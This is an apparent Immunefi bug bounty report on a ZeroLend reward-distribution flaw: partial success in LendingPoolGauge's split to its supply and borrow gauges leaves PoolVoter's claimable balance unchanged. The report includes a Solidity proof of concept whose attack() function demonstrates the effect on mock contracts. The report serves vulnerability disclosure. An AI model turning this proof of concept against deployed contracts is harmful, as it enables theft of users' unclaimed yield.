# 29120 - \[SC - High] Bug in reward distribution logic leads to theft...

Submitted on Mar 7th 2024 at 17:51:17 UTC by @Trust for [Boost | ZeroLend](https://immunefi.com/bounty/zerolend-boost/)

Report ID: #29120

Report type: Smart Contract

Report severity: High

Target: <https://github.com/zerolend/governance>

Impacts:

* Theft of unclaimed yield
* Permanent freezing of unclaimed yield

## Description

## Brief/Intro

The PoolVoter stores and distributes rewards for gauges based on their weights. The function below does distribution:

```
function distribute(address _gauge) public nonReentrant {
    uint256 _claimable = claimable[_gauge];
    claimable[_gauge] = 0;
    IERC20(reward).approve(_gauge, 0); // first set to 0, this helps reset some non-standard tokens
    IERC20(reward).approve(_gauge, _claimable);
    if (!IGauge(_gauge).notifyRewardAmount(address(reward), _claimable)) {
        // can return false, will simply not distribute tokens
        claimable[_gauge] = _claimable;
    }
}
```

One supported type of gauge is LendingPoolGauge. It splits rewards in 1/4, 3/4 ratio between supply and borrow gauge.

```
function notifyRewardAmount(
    address token,
    uint256 amount
) external returns (bool) {
    IERC20(token).safeTransferFrom(msg.sender, address(this), amount);
    // send 1/4 to the supply side
    IERC20(token).approve(address(supplyGauge), amount);
    bool a = supplyGauge.notifyRewardAmount(token, amount / 4);
    // send 3/4th to the borrow side
    IERC20(token).approve(address(borrowGauge), amount);
    bool b = borrowGauge.notifyRewardAmount(token, (amount / 4) * 3);
    return a && b;
}
```

Note that each GaugeIncetiveController (Supply / borrow gauge) has their own `notifyRewardAmount()`. It's logic states that if the new reward is smaller than the current reward, it does not pick up the reward and returns false.

```
function notifyRewardAmount(
    IERC20 token,
    uint256 amount
) external nonReentrant updateReward(token, address(0)) returns (bool) {
    if (block.timestamp >= periodFinish[token]) {
        token.safeTransferFrom(msg.sender, address(this), amount);
        rewardRate[token] = amount / DURATION;
    } else {
        uint256 _remaining = periodFinish[token] - block.timestamp;
        uint256 _left = _remaining * rewardRate[token];
        if (amount < _left) {
            return false; // don't revert to help distribute run through its tokens
        }
        token.safeTransferFrom(msg.sender, address(this), amount);
        rewardRate[token] = (amount + _left) / DURATION;
    }
    lastUpdateTime[token] = block.timestamp;
    periodFinish[token] = block.timestamp + DURATION;
    // if it is a new incentive, add it to the stack
    if (isIncentive[token] == false) {
        isIncentive[token] = true;
        incentives.push(token);
    }
    return true;
}
```

## Vulnerability Details

The issue is in the mishandling of the response in `distribute()` when notifying the LendingPoolGauge of rewards. When `notifyRewardAmount()` returns false, we treat the entire notified amount as not sent. This is correct for most gauges, but for LendingPoolGauge it could be that one of the sub-gauges received the funds succesfully and one didn't. When that happens, `notifyRewardAmount()` returns false:

```
IERC20(token).approve(address(supplyGauge), amount);
bool a = supplyGauge.notifyRewardAmount(token, amount / 4);
// send 3/4th to the borrow side
IERC20(token).approve(address(borrowGauge), amount);
bool b = borrowGauge.notifyRewardAmount(token, (amount / 4) * 3);
return a && b;
```

This breaks the invariant that there's always enough rewards in PoolVoter to satisfy reward dispatch - since some are sent but `claimable` remains unchanged, it follows that the reward mechanism is insolvent. It can also be abused by attackers to collect rewards over and over again, for free.

## Impact Details

Rewards can be misappropriated by an attacker or through natural sequence of events. Users will lose access to unclaimed yield.

## Proof of Concept

The POC is implemented as a standalone file. Simply run `attack()` on DistributorPOC which shows that funds were sent to the supply gauge, but the `claimable` for LendingPoolGauge remains unchanged.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.6;

interface IRewardDistributor {
    // used to notify a gauge/bribe of a given reward, this can create griefing attacks by extending rewards
    // TODO: rework to weekly resets, _updatePeriod as per v1 bribes
    function notifyRewardAmount(
        address token,
        uint amount
    ) external returns (bool);
}

interface IRewardBase {
    function incentivesLength() external view returns (uint);

    // returns the last time the reward was modified or periodFinish if the reward has ended
    function lastTimeRewardApplicable(
        address token
    ) external view returns (uint);

    // how to calculate the reward given per token "staked" (or voted for bribes)
    function rewardPerToken(address token) external view returns (uint);

    // how to calculate the total earnings of an address for a given token
    function earned(
        address token,
        address account
    ) external view returns (uint);

    // total amount of rewards returned for the 7 day duration
    function getRewardForDuration(address token) external view returns (uint);

    // allows a user to claim rewards for a given token
    function getReward(address token) external;

    // used to notify a gauge/bribe of a given reward, this can create griefing attacks by extending rewards
    // TODO: rework to weekly resets, _updatePeriod as per v1 bribes
    function notifyRewardAmount(
        address token,
        uint amount
    ) external returns (bool);
}

// Gauges are used to incentivize pools, they emit reward tokens over 7 days for staked LP tokens
// Nuance: getReward must be called at least once for tokens other than incentive[0] to start accrueing rewards
interface IGauge is IRewardBase {
    function rewardPerToken(
        address token
    ) external view override returns (uint);

    // used to update an account internally and externally, since ve decays over times, an address could have 0 balance but still register here
    function kick(address account) external;

    function derivedBalance(address account) external view returns (uint);

    function earned(
        address token,
        address account
    ) external view override returns (uint);

    function deposit(uint amount, address account) external;

    function withdraw() external;

    function withdraw(uint amount) external;

    function exit() external;
}

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

// Gauges are used to incentivize pools, they emit reward tokens over 14 days for staked LP tokens
// Nuance: getReward must be called at least once for tokens other than incentive[0] to start accrueing rewards
contract LendingPoolGauge is IRewardDistributor {
    using SafeERC20 for IERC20;
    IRewardDistributor public supplyGauge;
    IRewardDistributor public borrowGauge;

    constructor(address _supplyGauge, address _borrowGauge) {
        supplyGauge = IRewardDistributor(_supplyGauge);
        borrowGauge = IRewardDistributor(_borrowGauge);
    }

    function notifyRewardAmount(
        address token,
        uint256 amount
    ) external returns (bool) {
        IERC20(token).safeTransferFrom(msg.sender, address(this), amount);

        // send 1/4 to the supply side
        IERC20(token).approve(address(supplyGauge), amount);
        bool a = supplyGauge.notifyRewardAmount(token, amount / 4);

        // send 3/4th to the borrow side
        IERC20(token).approve(address(borrowGauge), amount);
        bool b = borrowGauge.notifyRewardAmount(token, (amount / 4) * 3);

        return a && b;
    }
}


contract MockIncentiveController {

    uint capacity;

    constructor(uint cap)  {
        capacity = cap;
    }

    function notifyRewardAmount(
    IERC20 token,
    uint256 amount
) external returns (bool) {
    if(token.balanceOf(address(this)) + amount > capacity )
        return false;
    token.transferFrom(msg.sender, address(this), amount);
    return true;
    }
}

contract Distributor {

    constructor(IERC20 rewardToken) {
        reward = rewardToken;
    }

    mapping(address => uint256) public claimable;
    IERC20 public reward;


    function distribute(address _gauge) public {
        uint256 _claimable = claimable[_gauge];
        claimable[_gauge] = 0;
        IERC20(reward).approve(_gauge, 0); // first set to 0, this helps reset some non-standard tokens
        IERC20(reward).approve(_gauge, _claimable);
        if (!IGauge(_gauge).notifyRewardAmount(address(reward), _claimable)) {
            // can return false, will simply not distribute tokens
            claimable[_gauge] = _claimable;
        }
    }

    function set_claimable(address gauge, uint256 claim) external {
        claimable[gauge] = claim;
    }
}

contract Zero is ERC20 {
    constructor() ERC20("Zero","ZRO") {
        _mint(msg.sender, 100_000 * 1e18);
    }
}

contract DistributorPOC {
    MockIncentiveController supply_gauge;
    MockIncentiveController borrow_gauge;
    LendingPoolGauge lending_gauge;
    Zero zero;
    Distributor d;

    constructor() {
        supply_gauge = new MockIncentiveController(10e18);
        borrow_gauge = new MockIncentiveController(10e18);
        lending_gauge = new LendingPoolGauge(address(supply_gauge), address(borrow_gauge));
        zero = new Zero();
        d = new Distributor(zero);
        zero.transfer(address(d), 100e18);
    }

    function attack() external {
        d.set_claimable(address(lending_gauge), 30e18);
        d.distribute(address(lending_gauge));

        require(zero.balanceOf(address(supply_gauge)) == 7.5e18);
        require(zero.balanceOf(address(borrow_gauge)) == 0);

        require(d.claimable(address(lending_gauge)) == 30e18);        
    }
}
```
